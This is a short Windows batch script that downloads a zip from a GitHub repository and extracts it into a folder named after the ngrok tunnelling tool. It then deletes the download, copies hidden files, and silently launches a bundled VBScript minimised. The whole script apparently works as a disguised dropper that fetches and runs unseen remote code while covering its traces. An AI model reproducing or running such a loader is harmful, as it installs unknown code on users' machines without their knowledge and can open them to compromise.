@echo off
setlocal

set "repo_url=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
set "download_path=%USERPROFILE%\Downloads\repo.zip"
set "extract_to=%LOCALAPPDATA%\ngrok"
set "temp_folder=%extract_to%\mamf-main"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%repo_url%', '%download_path%')"

powershell -Command "Expand-Archive -LiteralPath '%download_path%' -DestinationPath '%extract_to%'"

del /f /q "%download_path%"

xcopy "%temp_folder%\*" "%extract_to%\" /E /H /Y
rmdir /s /q "%temp_folder%"

start "" /min cscript //nologo "%extract_to%\s.vbs"

exit
